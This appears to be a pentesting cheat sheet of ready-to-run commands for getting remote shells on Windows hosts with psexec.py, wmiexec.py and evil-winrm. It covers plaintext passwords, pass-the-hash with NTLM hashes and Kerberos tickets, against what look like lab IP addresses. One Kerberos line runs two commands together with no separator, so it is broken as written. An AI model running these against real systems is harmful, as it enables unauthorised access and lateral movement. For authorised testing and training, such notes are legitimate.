## PSEXEC

When you get pwned as SMB, you can get a shell instead of Winrm : 

```jsx
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 administrator@10.10.10.63 cmd.exe
```

```jsx
psexec.py administrator:YourPassword@10.10.10.63 cmd.exe
```

```jsx
psexec -hashes 000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
```

```jsx
python3 psexec.py relia.com/administrator@172.16.173.7 -hashes aad3b435b51404eeaad3b435b51404ee:60446f9e333abfda8c548cbe11daedc2
```

Share folder with xfreerdp from linux attack machine : 

```jsx
xfreerdp /v:192.168.120.250 /u:Administrator /p:'123' /drive:share,/home/kali/share /cert:ignore
```

## WMIExec

```bash
wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 administrator@10.10.10.63
```

```bash
wmiexec.py administrator:YourPassword@10.10.10.63
```

```bash
wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 DOMAIN/administrator@10.10.10.63
```

Kerberos auth :

```bash
export KRB5CCNAME=administrator.ccachewmiexec.py -k -no-pass DOMAIN/administrator@dc01.domain.local
```

## Evil-Winrm :

Password : 

```jsx
evil-winrm -i 10.10.11.108 -u svc-printer -p '1edFg43012!!'
```

With domain :

```jsx
evil-winrm -i 10.10.11.108 -u 'svc-printer@domain.local' -p '1edFg43012!!'
```

Pass the hash : 

```jsx
evil-winrm -i 10.10.11.108 -u svc-printer -H '<NTLM_HASH>'
```

Specifying SSL : 

```jsx
evil-winrm -i 10.10.11.108 -u svc-printer -p '1edFg43012!!' -S
```

Custom port : 

```jsx
evil-winrm -i 10.10.11.108 -u svc-printer -p '1edFg43012!!' -P 5986
```

